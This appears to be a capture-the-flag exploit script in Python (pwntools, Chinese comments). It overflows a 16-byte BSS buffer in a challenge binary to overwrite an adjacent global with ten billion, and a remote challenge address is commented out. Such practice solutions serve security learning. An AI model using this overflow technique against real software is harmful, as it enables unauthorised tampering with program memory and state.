# 假设已经运行到了接收完 "Please tell me how much of your assets you have." 这句话
from kk import*
p = process('./pwn')
#p = remote('120.26.60.25',20211)
# 1. 应对 scanf：随便输入一个数字，只要不报错就行
p.sendline(b'1')

# 接收下一句提示
p.recvuntil(b"Please tell me your name.\n")

# 2. 应对 read：利用 24 字节读取，打 BSS 溢出
# 前 16 字节填满 buf_，后 8 字节精确覆盖 qword_4060 为 100 亿
# (10000000000 在 64 位内存中的布局正好可以用 p64 打包)
target_money = 10000000000
payload = b'A' * 16 + p64(target_money)

p.send(payload)

# 3. 见证奇迹的时刻
p.interactive()